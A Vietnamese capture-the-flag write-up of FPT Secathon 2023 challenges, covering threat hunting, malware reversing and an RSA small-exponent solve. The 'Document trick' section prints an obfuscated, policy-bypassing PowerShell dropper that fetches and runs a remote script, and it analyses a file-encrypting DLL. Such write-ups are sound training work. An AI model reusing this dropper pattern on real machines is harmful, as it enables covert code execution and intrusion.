FPT Secathon 2023
====
<table align = "center">
<h2 align=center>MỤC LỤC CHALLANGE (Still updating...)</h2>
  <tr>
  <td>

STT | Link |
| :--------- | :-- |
| [MISC] PHASE 1: Threat Hunting  | [Link](#misc-phase-1-threat-hunting) | 
| [MISC] Document trick  | [Link](#misc-document-trick) | 
  </td>
  <td>

STT | Link |
| :--------- | :--: | 
| [WEB] Baby Injection  | [Link](#web-baby-injection) | 
| [WEB] EHC social netwrok 1  | [Link](#web-ehc-social-network-1) |  
  </td>
  </tr>
</table>

<table align = "center">
  <tr>
  <td>

STT | Link |
| :--------- | :-- |
| [CRYPTO] Combine  | [Link](#crypto-combine) | 
  </td>
  <td>

  </td>
  </tr>
</table>

## [MISC] PHASE 1: Threat Hunting

```
Bạn được giao nhiệm vụ săn tìm mã độc ẩn trong một máy window 10 chứa (nhiều) dữ liệu (quan trọng). Flag chính là tên file (không chứa path) của mẫu mã độc bạn cần tìm. Nội dung của flag không chứa kí tự viết hoa. Dưới đây là link tải file máy ảo (có thể bỏ vào VMWARE hay Virtualbox để chạy) . Cần giải bài này trước khi giải Phase 2: Malware analysis Mật khẩu vào máy ảo là "123"
```
Link tải: [tại đây](https://drive.google.com/file/d/16ntnmYhpmU67uPMcxB_p2OcRRPCqjSUC/view?usp=sharing)

Đề cho 1 file OVA Windows 10, mở bằng Virtual Box, vào bằng công cụ `autoruns` bên trong `sysinternals` để xem những chương trình chạy trong quá trình đăng nhập hoặc khởi động. Vào bên trong ta thấy được một chương trình khá là đặc biệt 

<p align ="center">
  <img src="https://github.com/bananNat/FUSec2023/assets/100250271/c96817b4-1e04-432c-8660-69371b02d308">
</p>

Tên là `scvhost.exe` nhưng lại không phải của Microsoft mà của RedApple. Submit lên thử VirusTotal thì thấy nó có mùi virus. Và đây là flag.
#### Flag: FUSec{scvhost.exe}



## [MISC] Document trick

```
Người chơi lưu ý hãy tạo trước thư mục con TEST_ENCRYPT ở thư mục Desktop trước khi chạy file.
```

Đề bài cho chúng ta một file zip giải nén nó ra ta sẽ được 1 folder chứa file bị mã hóa và 1 file bat.


<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/17aa546a-fd68-4a7d-8732-d7e24f9325f1">
</p>

```
Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIAUwBXADUAMgBiADIAdABsAEwAVgBkAGwAWQBsAEoAbABjAFgAVgBsAGMAMwBRAGcASQBtAGgAMABkAEgAQgB6AE8AaQA4AHYAYwBtAEYAMwBMAG0AZABwAGQARwBoADEAWQBuAFYAegBaAFgASgBqAGIAMgA1ADAAWgBXADUAMABMAG0ATgB2AGIAUwA5AE4AYwBrAFYAdQBNAFcAZAB0AFkAUwA5AG0AZABYAE4AbABZAHoASQB3AE0AagBOAGYAWQAyAGgAaABiAEcAdwB2AGIAVwBGAHAAYgBpADkAegBkAEcARgBuAFoAVABFAHUAYwBIAE0AeABJAGkAQQB0AFQAMwBWADAAUgBtAGwAcwBaAFMAQQBrAFoAVwA1ADIATwBuAFIAbABiAFgAQgBjAGMAMwBSAGgAWgAyAFUAeABMAG4AQgB6AE0AUQAwAEsASgBIAE0AZwBQAFMAQgBIAFoAWABRAHQAUQAyADkAdQBkAEcAVgB1AGQAQwBBAGsAWgBXADUAMgBPAG4AUgBsAGIAWABCAGMAYwAzAFIAaABaADIAVQB4AEwAbgBCAHoATQBTAEIAOABJAEUAOQAxAGQAQwAxAFQAZABIAEoAcABiAG0AYwBOAEMAbQBsAGwAZQBDAGcAawBjAHkAawBOAEMAZwA9AD0AIgB9ACcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AUwBjAHIAaQBwAHQAKQApACAAfAAgAGkAZQB4AA==
```

Có lẽ ta phải tìm cách để decrypt cái flag bị mã hóa kia rồi. Vừa thấy đoạn base64 mình lên cyberchef decode.

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/892192a8-da94-49e5-8c88-270c6ea32f9a">
</p>

Lại thêm đoạn base64 nữa nên decode tiếp.

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/ec05fa87-562e-4ebf-b7e9-d7cbb3301dca">
</p>

Ta truy cập vào đường [link](https://raw.githubusercontent.com/MrEn1gma/fusec2023_chall/main/stage1.ps1) github được một đoạn powershell mới.

Đến đây mình tiếp tục decode base64 và nhận được một file có header không biết là thể loại gì. Tuy nhiên bên trong lại có nhiều chuỗi đọc được đáng ngờ nên mình tải file về và `strings`.

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/f828a80f-ed7f-4fc4-bf1f-8af5fa4c3691">
</p>

`DOS mode` cho thấy đây là một file PE nên mình đã dùng `Hxd` xem thử và phát hiện ở byte thứ 0xc04 là header `MZ` nên mình đã xóa hết phần byte phía trên để lấy ra file DLL này (khi load vào ida thấy có dllEntryPoint).

Mặt khác teamate của mình lúc research xem cách hoạt động của powershell này cũng thấy có một số thứ thú vị các bạn có thể đọc ở đây tuy nhiên bài này vẫn tập trung cái DLL là chính.

[Cobalt Strike Shellcode](https://ethical.blue/textz/n/29)

Xem strings của cái DLL này thì thấy có 2 chuỗi `.encrypt_me` và `.en1gmalware` cũng chính là 2 đuôi file chồng lên nhau của file flag. Mình liền nhảy tới hàm sử dụng 2 chuỗi này và đặt 2 cái break point ngay đó.

Static hàm có `.encrypt_me` thì sẽ thấy nó sẽ đang cố tìm file có đuôi trên.

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/31ea47fb-9e49-492a-95c5-bbb1ff585769">
</p>

Static hàm có `.en1gmalware` thì thấy nó có một đoạn xor từng byte `v41` lấy từ `v46` với từng byte `Block` trông rất giống mã hóa xor với key bình thường nên mình sẽ lưu ý chỗ này.

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/f2afc34e-c28c-44e1-8cf4-a4e4bba743db">
</p>

Ngoài ra ở hàm `DLLMain` chương trình còn thực hiện tìm path tới folder `TEST_ENCRYPT` mà đề bài cho.

Đến đây mình có thể phỏng đoán được sơ cách chương trình này mã hóa flag.

- Bước 1: tìm folder `TEST_ENCRYPT`
- Bước 2: Tìm file có đuôi `.encrypt_me`
- Bước 3: Thực hiện xor từng byte với `Block`
- Bước 4: Thêm đuôi file `.en1gmalware` vào

Tuy nhiên không biết được các giá trị của `Block` là gì chỉ với static nên ít nhất cũng phải chạy được cái DLL này đã.

Dưới đây là đoạn code ngắn arch x86 để chạy file DLL.

```C++
#include <windows.h>
#include <iostream>

int main()
{
	HINSTANCE hGetProcIDDLL = LoadLibrary("download");
}
```

Đến đây khi debug mình nhận thấy một điều nếu không tìm thấy file `.encrypt_me` nào bên trong folder `TEST_ENCRYPT` thì chương trình sẽ bỏ qua không vào hàm `.en1gmalware` vì thế mình xóa đuôi `.en1gmalware` của file flag rồi debug lại thì nó đã vào được. Trace đến đoạn code mã hóa bằng xor từ hình trên mình lấy các giá trị từ `Block` ra rồi xor ngược lại với file mã hóa là ra flag.

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/68e05542-d43d-4c45-98ca-7a053954f4e0">
</p>

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/3aaf7138-8ae8-49cc-a8ee-8e17c45dcc72">
</p>

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/88344bc9-8e55-429e-8f30-87a90609cc28">
</p>

Hoặc đơn giản hơn là chỉ cần chạy cái file x86 load DLL là nó cũng tự encrypt ngược lại thành ra decrypt ra flag luôn 🤡

<p align ="center">
  <img src="https://github.com/bananNat/Writeups/assets/105005557/fa787202-da35-4457-b88d-938d13a92c69">
</p>

#### Flag: FUSec{b6ffcf2ef6bf4f1a0debe2fd591992ade0597c05f49dfdd66a6377009217fe41}


## [CRYPTO] Combine

```
The symmetric crypto algorithm is much more secure, but the problem of key distribution is annoying. Why don't we combine both symmetric and asymmetric algorithm in a crypto system. What a brilliant idea!
```
Link tải: [tại đây](https://drive.google.com/drive/folders/17t2v_JqvkxZnjui4PVl4CgkqqXzV_z--?usp=sharing)

Đọc qua source code ta thấy đề cho n,e,c và một ciphertext, `c` được tính bởi hàm encrypt_key(), cơ bản là một hàm `rsa`, cho `p` và `q` là hai số `random`. Nhận thấy `e` là số mũ nhỏ --> `Small exponent attack` tìm được `key`

Sau đó dùng `key` với `msg` để mã hóa ra ciphertext với AES padding, viết ngược script lại để ra được `msg` khi có `key` và `ciphertext`

Full script solve:

```
import gmpy2
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES

n = 17209865306489383127800020243389994329129743604782790572071575275930356482173664633977129059765483365641382694889746793832394394570779520318736174413698255275805470489995770799549145326336810606098666485462172397721883061380164674372281155031229403077923081446873681038939824476853501573626662210456685550050398627753809494063023262928406194832122173907376911569530179213802008987425021865006236985258208235745676711294952229465208427722435166889999294578405054346630724018303425483416613451938567146420297094727347064526763529390676971710365525083049556260598332852178425692853805520818042005192063672211992678540011
n=hex(n)
e = 3
cipher_string = 142196723273747238898852175173915220249887834079871068954399297555327440564641299650087764716642697466878642687260087329740593337673114537926971425515696694822194006024953138119955781575720865321942965774838545548158954058397248000
gs = gmpy2.mpz(cipher_string)
gm = gmpy2.mpz(n)
ge = gmpy2.mpz(e)

root, exact = gmpy2.iroot(gs, ge)
#print(long_to_bytes(root))
def decrypt_message(key, ciphertext):
  BS = 16
  ciphertext = bytes.fromhex(ciphertext)
  cipher = AES.new(key, AES.MODE_ECB)
  plaintext = cipher.decrypt(ciphertext)
  plaintext = plaintext.decode().rstrip(chr(BS - len(plaintext) % BS))
  return plaintext
cipher_text = "e6c2921a3edb52639e871ebad04f16ff4580870a8522295cf58914b09fee749afcdd94a0beb8471dbaa50ed37693653295d4e798798674e2048f5c233cd9aba1"
print(decrypt_message(long_to_bytes(root),cipher_text))
```
#### Flag: FUSEC{The_combine_crypto_system_is_really_secure!!!}


## [WEB] Baby Injection
<p align ="center">
  <img src="https://github.com/bananNat/FUSec2023/assets/100250271/5cb20490-dd78-401b-b7fc-3720c717f7bd">
</p>


## [WEB] EHC social netwrok 1

<p align ="center">
  <img src="https://github.com/bananNat/FUSec2023/assets/100250271/27a9f045-969a-49f9-a968-ac247af9dffb">
</p>
